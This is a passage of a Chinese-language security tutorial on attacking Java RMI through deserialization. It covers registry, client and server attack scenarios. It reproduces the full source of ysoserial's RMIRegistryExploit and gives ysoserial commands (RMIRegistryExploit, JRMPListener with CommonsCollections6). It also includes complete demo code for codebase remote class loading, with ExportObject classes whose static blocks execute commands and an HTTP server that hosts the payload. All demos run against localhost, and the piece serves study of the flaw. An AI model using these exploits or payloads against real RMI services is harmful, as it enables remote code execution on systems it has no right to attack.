攻击者注册中心时一般为客户端攻击者注册中心，因为服务器端和注册中心是放在一起启动的，启动后服务器端很难再去操控，下面针对上面的代码分析结果进行简单的测试：

**方式1：通过bind实施攻击**

结合上面的分析我们可以通过利用bind来试试攻击测试，而这一个利用载荷其实再ysoserial中已经集成了，下面是攻击演示：  
Step 1：首先启动服务器端

![](images/20241213144247-76ddeaa8-b91d-1.png)

Step 2：随后客户端模拟攻击者进行端口扫描发现开启了1099端口，随后直接拿起ysoserial就直接开打

```
"C:\Program Files\Java\jdk1.8.0_102\bin\java.exe" -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections6 calc

```

![](images/20241213144309-844fbc48-b91d-1.png)

下面是关于ysoserial中RMIRegistryExploit的代码分析研讨：  
(1) TrustAllSSL：用于信任所有的SSL证书的管理器：

```
private static class TrustAllSSL implements X509TrustManager {
    private static final X509Certificate[] ANY_CA = {};
    public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
    public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
    public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
}

```

(2) RMISSLClientSocketFactory：创建了用于RMI的SSL套接字并使用TrustAllSSL来信任所有SSL证书

```
private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
    public Socket createSocket(String host, int port) throws IOException {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
            SSLSocketFactory factory = ctx.getSocketFactory();
            return factory.createSocket(host, port);
        } catch(Exception e) {
            throw new IOException(e);
        }
    }
}

```

(3) Main：首先从命令行参数中获取目标主机、端口、要使用的有效载荷类名和命令，随后通过LocateRegistry.getRegistry方法获取指定主机和端口的RMI注册表实例，根据提供的类名加载有效载荷类并尝试列出注册表中的对象，如果失败则使用SSL连接进行重试，紧接着调用exploit方法确保在构造或反序列化期间不会触发有效载荷，调用exploit方法

```
public static void main(final String[] args) throws Exception {
    final String host = args[0];
    final int port = Integer.parseInt(args[1]);
    final String command = args[3];
    Registry registry = LocateRegistry.getRegistry(host, port);
    final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
    final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);

    // test RMI registry connection and upgrade to SSL connection on fail
    try {
        registry.list();
    } catch(ConnectIOException ex) {
        registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
    }

    // ensure payload doesn't detonate during construction or deserialization
    exploit(registry, payloadClass, command);
}

```

(4) exploit：随后在exploit方法中根据先前加载的有效载荷类创建一个新实例，根据传入的命令生成有效载荷对象，此处使用Gadgets.createMap创建一个包含有效载荷的Map对象并利用Gadgets.createMemoitizedProxy将其包装为一个远程对象(Remote)，这样做是为了使得这个对象可以被RMI注册表访问并能够触发有效载荷，使用registry.bind方法将刚刚创建的远程对象绑定到RMI注册表中从而触发恶意载荷

```
public static void exploit(final Registry registry,
            final Class<? extends ObjectPayload> payloadClass,
            final String command) throws Exception {
        new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
            ObjectPayload payloadObj = payloadClass.newInstance();
            Object payload = payloadObj.getObject(command);
            String name = "pwned" + System.nanoTime();
            Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
            try {
                registry.bind(name, remote);
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Utils.releasePayload(payloadObj, payload);
            return null;
        }});
    }

```

完整代码如下所示：

```
package ysoserial.exploit;

import java.io.IOException;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.concurrent.Callable;
import javax.net.ssl.*;

import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.util.Gadgets;
import ysoserial.secmgr.ExecCheckingSecurityManager;

/*
 * Utility program for exploiting RMI registries running with required gadgets available in their ClassLoader.
 * Attempts to exploit the registry itself, then enumerates registered endpoints and their interfaces.
 *
 * TODO: automatic exploitation of endpoints, potentially with automated download and use of jars containing remote
 * interfaces. See http://www.findmaven.net/api/find/class/org.springframework.remoting.rmi.RmiInvocationHandler .
 */
@SuppressWarnings({"rawtypes", "unchecked"})
public class RMIRegistryExploit {
    private static class TrustAllSSL implements X509TrustManager {
        private static final X509Certificate[] ANY_CA = {};
        public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
    }

    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
        public Socket createSocket(String host, int port) throws IOException {
            try {
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
                SSLSocketFactory factory = ctx.getSocketFactory();
                return factory.createSocket(host, port);
            } catch(Exception e) {
                throw new IOException(e);
            }
        }
    }

    public static void main(final String[] args) throws Exception {
        final String host = args[0];
        final int port = Integer.parseInt(args[1]);
        final String command = args[3];
        Registry registry = LocateRegistry.getRegistry(host, port);
        final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
        final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);

        // test RMI registry connection and upgrade to SSL connection on fail
        try {
            registry.list();
        } catch(ConnectIOException ex) {
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }

        // ensure payload doesn't detonate during construction or deserialization
        exploit(registry, payloadClass, command);
    }

    public static void exploit(final Registry registry,
            final Class<? extends ObjectPayload> payloadClass,
            final String command) throws Exception {
        new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
            ObjectPayload payloadObj = payloadClass.newInstance();
            Object payload = payloadObj.getObject(command);
            String name = "pwned" + System.nanoTime();
            Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
            try {
                registry.bind(name, remote);
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Utils.releasePayload(payloadObj, payload);
            return null;
        }});
    }
}

```

**方式2：通过rebind实施攻击**  
篇幅原因 不做展开，原理看上面的分析部分

**方式3：通过lookup实施攻击**  
篇幅原因 不做展开，原理看上面的分析部分

**方式4：通过unbind实施攻击**  
篇幅原因 不做展开，原理看上面的分析部分

### 注册中心打客户

#### 利用条件

此类场景下受害者是RMI客户端，但是漏洞的利用需要满足以下条件：

* 控制客户端去连接恶意服务端
* 目标客户端允许远程加载类
* JDK 6u45、7u21、8u121以下

#### 原理刨析

因为客户端和服务端都需要和注册中心进行通信，所以可以通过恶意的注册中心攻击客户端，也可以攻击服务端，但是由于服务端和注册中心在一起所以大多数情况都是注册中心打客户端，从之前源代码角度对客户端请求通信的过程分析中我们可以看到在客户端通过lookup向注册表中心发起查询之后RMIRegistry会返回之前创建的Stub存根对象(动态代理对象)

![](images/20241213144637-fff22958-b91d-1.png)

![](images/20241213144645-04f60744-b91e-1.png)

最终调用到sun.rmi.transport.StreamRemoteCall#executeCall，从下面可以看到如果注册中心返回一个序列化的对象数据信息过来时会进行一次反序列化操作

![](images/20241213144658-0cdf2b52-b91e-1.png)

#### 攻击演示

下面我们借助ysoserial来模拟一个恶意的注册中心并诱导客户端去访问注册中心，此场景用于蜜罐实现反制是一个不错的选择：  
Step 1：使用JRMPListener在1099端口(RMI注册中心默认端口)起一个托管了恶意攻击载荷的服务端

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe

```

![](images/20241213144721-1a8142fe-b91e-1.png)

Step 2：随后客户端模拟攻击者进行端口扫描发现开启了1099端口，随后直接拿起ysoserial就直接开打结果被反打

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections6 whoami

```

![](images/20241213144742-270fd62a-b91e-1.png)

### 服务端打客户端

#### 攻击原理

在RMI中远程调用的方法返回的不一定是一个基础数据类型，也有可能是返回一个对象，在服务端给客户端返回一个对象的时候客户端就会对其进行进行反序列化操作，所以我们可以伪造一个恶意服务端，当客户端调用某个远程对象的时候，返回的就是我们事先构造好的恶意对象，这个其实和上面的注册中心打客户端是一个类型，因为这里的注册中心和服务端其实是放在一起的，在启动服务端的时候就需要去创建一个注册表，另外一种则是通过动态加载的方式加载服务端指定的恶意远程类，随后反序列化造成命令执行

#### 攻击方式

服务端攻击客户端的场景分为以下两种：

* 服务端返回Object对象
* 使用codebase进行动态加载

#### 攻击场景1

下面我们首先演示以下服务端返回Object对象的情况，演示如下(和注册表打客户端类似)：  
下面我们借助ysoserial来模拟一个恶意的服务端并诱导客户端去访问服务端，此场景用于蜜罐实现反制是一个不错的选择：  
Step 1：使用JRMPListener在1099端口(RMI注册中心默认端口)起一个恶意服务端：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe

```

![](images/20241213144844-4c1de718-b91e-1.png)

Step 2：随后客户端模拟攻击者进行端口扫描发现开启了1099端口，随后直接拿起ysoserial就直接开打

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections6 whoami

```

![](images/20241213144905-5830bc56-b91e-1.png)

#### 攻击场景2

在此类场景下服务端在本地找不到客户端需要检索的类时就返回一个codebase给客户端，让客户端去远程加载类，具体演示代码如下：  
(1) 服务端代码：  
Services.java——远程对象接口(公开的)

```
package com.longofo.javarmi;

import java.rmi.RemoteException;

public interface Services extends java.rmi.Remote {
    Object sendMessage(Message msg) throws RemoteException;
}

```

ServicesImpl1——远程对象接口的实现，其中sendMessage方法返回值为ExportObject类型

```
package com.longofo.javarmi;

import com.longofo.remoteclass.ExportObject;

import java.rmi.RemoteException;

public class ServicesImpl1 implements Services {
    @Override
    public ExportObject sendMessage(Message msg) throws RemoteException {
        return new ExportObject();
    }
}

```

RMIServer1——RMI服务端，此时RMIServer端指定了客户端codebase的地址，即客户端反序列化ExportObject时需要通过服务端提供的codebase来加载该类

```
package com.longofo.javarmi;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer1 {
    public static void main(String[] args) {
        try {
            // 实例化服务端远程对象
            ServicesImpl1 obj = new ServicesImpl1();

            // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);

            //设置java.rmi.server.codebase
            System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");

            Registry reg;
            try {
                // 创建Registry
                reg = LocateRegistry.createRegistry(9999);
                System.out.println("java RMI registry created. port on 9999...");
            } catch (Exception e) {
                System.out.println("Using existing registry");
                reg = LocateRegistry.getRegistry();
            }
            //绑定远程对象到Registry
            reg.bind("Services", services);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}

```

(2) 客户端代码  
RMI客户端如下所示，RMI客户端正常操作，传入Message对象并调用服务端sendMessage方法

```
package com.longofo.javarmi;

import java.rmi.RMISecurityManager;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient1 {
    /**
     * Java RMI恶意利用demo
     *
     * @param args
     * @throws Exception
     */
    public static void main(String[] args) throws Exception {
        //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager并配置policy以允许从远程加载类库
        System.setProperty("java.security.policy", RMIClient1.class.getClassLoader().getResource("java.policy").getFile());
        RMISecurityManager securityManager = new RMISecurityManager();
        System.setSecurityManager(securityManager);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
        // 获取远程对象的引用
        Services services = (Services) registry.lookup("Services");
        Message message = new Message();
        message.setMessage("Al1ex");

        services.sendMessage(message);
    }
}

```

(3) 代码托管端  
HttpServer.java

```
package com.longofo.remoteclass;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;

public class HttpServer implements HttpHandler {
    public void handle(HttpExchange httpExchange) {
        try {
            System.out.println("new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
            InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while (inputStream.available() > 0) {
                byteArrayOutputStream.write(inputStream.read());
            }

            byte[] bytes = byteArrayOutputStream.toByteArray();
            httpExchange.sendResponseHeaders(200, bytes.length);
            httpExchange.getResponseBody().write(bytes);
            httpExchange.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException {
        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);

        System.out.println("String HTTP Server on port: 8000");
        httpServer.createContext("/", new HttpServer());
        httpServer.setExecutor(null);
        httpServer.start();
    }
}

```

ExportObject.java

```
package com.longofo.remoteclass;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.Hashtable;

public class ExportObject implements ObjectFactory, Serializable {

    private static final long serialVersionUID = 4474289574195395731L;

    static {
        //这里由于在static代码块中，无法直接抛异常外带数据，不过在static中应该也有其他方式外带数据。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中所有远程加载类的地方都会调用static代码块
        try {
            exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
//        throw new Exception(sb);
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}

```

### 客户端打服务端

#### 利用条件

此类场景下受害者是RMI服务端，但是漏洞的利用需要满足以下条件：

* RMI服务端允许远程加载类
* JDK 6u45、7u21、8u121以下

#### 利用原理

RMI数据通信大量的使用了Java的对象反序列化，那么在使用RMI客户端去攻击RMI服务端时需要特别小心，如果本地RMI客户端刚好符合反序列化攻击的利用条件，那么RMI服务端返回一个恶意的反序列化攻击包可能会导致我们被反向攻击。在这种情况下，我们可以通过和RMI服务端建立Socket连接并使用RMI的JRMP协议发送恶意的序列化包，RMI服务端在处理JRMP消息时会反序列化消息对象从而实现RCE，同时客户端不用接受服务端的返回，因此这种攻击方式也更加安全，除此之外还可以通过指定codebase的方式进行利用

#### 利用方式1

下面的为客户端指定codebase打服务端类：  
(1) 服务端  
RMIServer2——RMI服务端

```
//RMIServer2.java
package com.longofo.javarmi;

import java.rmi.AlreadyBoundException;
import java.rmi.RMISecurityManager;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer2 {
    /**
     * Java RMI 服务端
     *
     * @param args
     */
    public static void main(String[] args) {
        try {
            // 实例化服务端远程对象
            ServicesImpl obj = new ServicesImpl();
            // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
            Registry reg;
            try {
                //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
                System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
                RMISecurityManager securityManager = new RMISecurityManager();
                System.setSecurityManager(securityManager);

                // 创建Registry
                reg = LocateRegistry.createRegistry(9999);
                System.out.println("java RMI registry created. port on 9999...");
            } catch (Exception e) {
                System.out.println("Using existing registry");
                reg = LocateRegistry.getRegistry();
            }
            //绑定远程对象到Registry
            reg.bind("Services", services);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}

```

Services——远程对象接口

```
package com.longofo.javarmi;

import java.rmi.RemoteException;

public interface Services extends java.rmi.Remote {
    Object sendMessage(Message msg) throws RemoteException;
}

```

(2) 恶意服务方法  
ExportObject1——恶意远程方法参数对象子类，该类实现对象工厂接口并且支持序列化

```
package com.longofo.remoteclass;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.Hashtable;

public class ExportObject1 implements ObjectFactory, Serializable {

    private static final long serialVersionUID = 4474289574195395731L;

    static {
        //这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中
        try {
            exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
        throw new Exception(sb);
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}

```

(3) 客户端  
RMIClient2——恶意RMI客户端，此时客户端指定codebase地址，服务端从客户端指定的codebase来加载class，此时客户端调用服务端的sendMessage函数传递的是ExportObject1对象

```
package com.longofo.javarmi;

import com.longofo.remoteclass.ExportObject1;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient2 {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",9999);
        // 获取远程对象的引用
        Services services = (Services) registry.lookup("Services");
        ExportObject1 exportObject1 = new ExportObject1();
        exportObject1.setMessage("hahaha");

        services.sendMessage(exportObject1);
    }
}

```

下面我们做一个简单的演示测试：  
Step 1：首先启动恶意载荷托管服务

![](images/20241213145214-c906b700-b91e-1.png)

Step 2：启动RMIServer服务端

![](images/20241213145227-d0c33d60-b91e-1.png)  
Step 3：启动客户端

![](images/20241213145242-d9978c52-b91e-1.png)

此时可以看到真正的命令执行点其实是在服务端：

![](images/20241213145254-e1139200-b91e-1.png)

## 版本限制

JDK版本对RMI动作加载类有如下JDK版本限制：  
![](images/20241213145358-07264e74-b91f-1.png)

## 参考链接

<https://blog.51cto.com/guojuanjun/1423392>  
<https://www.cnblogs.com/CoLo/p/15468660.html>  
<https://blog.csdn.net/lmy86263/article/details/72594760>  
<https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html>  
<https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html>
